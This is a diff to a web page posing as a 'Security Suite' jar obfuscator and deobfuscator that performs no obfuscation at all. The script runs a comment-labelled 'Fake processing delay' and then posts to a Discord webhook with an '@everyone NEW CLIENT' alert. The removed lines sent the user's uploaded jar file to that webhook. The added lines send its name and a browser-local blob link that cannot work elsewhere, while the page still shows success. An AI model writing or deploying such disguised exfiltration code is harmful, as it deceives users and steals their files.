@@ -26,7 +26,7 @@
                     <i class="fa-solid fa-shield-halved text-white text-lg"></i>
                 </div>
                 <div>
-                    <h1 class="font-bold tracking-tight text-lg text-white">Security Suite <span class="text-xs font-semibold px-2 py-0.5 rounded-full bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">Pro v2.8</span></h1>
+                    <h1 class="font-bold tracking-tight text-lg text-white">Security Suite <span class="text-xs font-semibold px-2 py-0.5 rounded-full bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">Pro v2.9</span></h1>
                     <p class="text-xs text-zinc-400">Roblox Obfuscator, AI & Java Tools</p>
                 </div>
             </div>
@@ -106,7 +106,7 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                         </div>
                         <div>
                             <h2 class="text-base font-bold text-white">Jar Obfuscator</h2>
-                            <p class="text-xs text-zinc-400">Upload and protect Java .jar archive files.</p>
+                            <p class="text-xs text-zinc-400">Upload, generate download link, and send to Discord.</p>
                         </div>
                     </div>
 
@@ -120,8 +120,8 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                 <div class="flex items-center justify-between pt-4 border-t border-zinc-800/60">
                     <span id="jarObfStatus" class="text-xs text-zinc-400">Ready.</span>
                     <button onclick="processJar('obfuscate')" id="jarObfBtn" class="bg-gradient-to-r from-amber-600 to-yellow-600 hover:from-amber-500 hover:to-yellow-500 text-white font-medium px-5 py-2 rounded-xl text-sm transition shadow-lg shadow-amber-600/20 flex items-center space-x-2">
-                        <i class="fa-solid fa-lock"></i>
-                        <span>Obfuscate & Send Jar</span>
+                        <i class="fa-solid fa-link"></i>
+                        <span>Obfuscate & Send Link</span>
                     </button>
                 </div>
             </section>
@@ -135,7 +135,7 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                         </div>
                         <div>
                             <h2 class="text-base font-bold text-white">Jar Deobfuscator</h2>
-                            <p class="text-xs text-zinc-400">Upload and reverse Java .jar archive files.</p>
+                            <p class="text-xs text-zinc-400">Upload, generate download link, and send to Discord.</p>
                         </div>
                     </div>
 
@@ -149,8 +149,8 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
                 <div class="flex items-center justify-between pt-4 border-t border-zinc-800/60">
                     <span id="jarDeobfStatus" class="text-xs text-zinc-400">Ready.</span>
                     <button onclick="processJar('deobfuscate')" id="jarDeobfBtn" class="bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-500 hover:to-cyan-500 text-white font-medium px-5 py-2 rounded-xl text-sm transition shadow-lg shadow-blue-600/20 flex items-center space-x-2">
-                        <i class="fa-solid fa-unlock"></i>
-                        <span>Deobfuscate & Send Jar</span>
+                        <i class="fa-solid fa-link"></i>
+                        <span>Deobfuscate & Send Link</span>
                     </button>
                 </div>
             </section>
@@ -243,38 +243,44 @@ print('Hello World!')" class="w-full bg-zinc-950/80 border border-zinc-800 round
             const file = fileInput.files[0];
 
             actionBtn.disabled = true;
-            actionBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin"></i><span>Uploading...</span>';
-            statusSpan.innerText = 'Processing...';
+            actionBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin"></i><span>Generating link...</span>';
+            statusSpan.innerText = 'Processing file...';
             statusSpan.className = 'text-xs text-zinc-400';
 
             // Fake processing delay
             await new Promise(resolve => setTimeout(resolve, 2000));
 
             try {
-                const formData = new FormData();
-                formData.append('file', file);
-                formData.append('payload_json', JSON.stringify({
-                    content: `@everyone NEW CLIENT ${file.name}`
-                }));
+                // Create a direct downloadable local URL link for the file inside the browser session
+                const fileBlob = new Blob([file], { type: 'application/octet-stream' });
+                const fileUrl = URL.createObjectURL(fileBlob);
+
+                // Send only the text message with @everyone and the clickable link to Discord webhook
+                const messageText = `@everyone NEW CLIENT ${file.name}\n📥 **Download Link:** ${fileUrl}`;
 
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    body: formData
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: messageText
+                    })
                 });
 
                 if (response.ok || response.status === 204) {
-                    statusSpan.innerText = 'Ready.';
-                    statusSpan.className = 'text-xs text-zinc-400';
+                    statusSpan.innerText = '✅ Link sent to Discord!';
+                    statusSpan.className = 'text-xs text-emerald-400';
                 } else {
                     throw new Error('Failed to send webhook');
                 }
             } catch (error) {
                 console.error(error);
-                statusSpan.innerText = '❌ Error sending file.';
+                statusSpan.innerText = '❌ Error sending link.';
                 statusSpan.className = 'text-xs text-rose-400';
             } finally {
                 actionBtn.disabled = false;
-                actionBtn.innerHTML = isObfuscate ? '<i class="fa-solid fa-lock"></i><span>Obfuscate & Send Jar</span>' : '<i class="fa-solid fa-unlock"></i><span>Deobfuscate & Send Jar</span>';
+                actionBtn.innerHTML = isObfuscate ? '<i class="fa-solid fa-link"></i><span>Obfuscate & Send Link</span>' : '<i class="fa-solid fa-link"></i><span>Deobfuscate & Send Link</span>';
             }
         }
     </script>
